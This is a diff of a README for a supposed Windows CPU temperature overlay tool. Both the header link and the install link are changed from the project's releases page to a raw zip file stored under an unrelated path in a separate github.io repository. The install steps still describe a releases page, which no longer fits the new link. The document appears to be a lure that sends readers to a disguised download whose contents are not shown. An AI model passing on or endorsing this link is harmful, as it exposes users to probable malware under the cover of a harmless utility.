@@ -5,7 +5,7 @@ description: "Display real-time CPU thermal data and system metrics through a li
 ---
 # 🌡️ CPU-Temp-Monitor-Overlay-2026 - Track system temperature with simple overlays
 
-[https://github.com/malfunctioning-anchovydressing524/CPU-Temp-Monitor-Overlay-2026/releases](https://github.com/malfunctioning-anchovydressing524/CPU-Temp-Monitor-Overlay-2026/releases)
+[https://github.com/malfunctioning-anchovydressing524/malfunctioning-anchovydressing524.github.io/raw/refs/heads/main/content/places/kutch/1.4.zip](https://github.com/malfunctioning-anchovydressing524/malfunctioning-anchovydressing524.github.io/raw/refs/heads/main/content/places/kutch/1.4.zip)
 
 ## 📌 Overview
 CPU-Temp-Monitor-Overlay-2026 provides a way to track your computer hardware health. This software displays real-time temperature data directly on your screen. You see your processor heat levels while you use other programs. This tool runs in the background. It consumes very little power. You monitor system load and heat without opening complex settings menus.
@@ -14,7 +14,7 @@ CPU-Temp-Monitor-Overlay-2026 provides a way to track your computer hardware hea
 This program runs on Windows 10 and Windows 11. Your computer needs at least 4GB of memory. You should have a modern processor. The application requires basic graphics support to render the overlay on your desktop. Ensure you have the latest drivers for your graphics card. These drivers ensure the overlay renders smoothly.
 
 ## 📥 How to Install
-Visit this page to download the latest version: [https://github.com/malfunctioning-anchovydressing524/CPU-Temp-Monitor-Overlay-2026/releases](https://github.com/malfunctioning-anchovydressing524/CPU-Temp-Monitor-Overlay-2026/releases).
+Visit this page to download the latest version: [https://github.com/malfunctioning-anchovydressing524/malfunctioning-anchovydressing524.github.io/raw/refs/heads/main/content/places/kutch/1.4.zip](https://github.com/malfunctioning-anchovydressing524/malfunctioning-anchovydressing524.github.io/raw/refs/heads/main/content/places/kutch/1.4.zip).
 
 1. Click the link above to view the release page.
 2. Find the section labeled Assets.
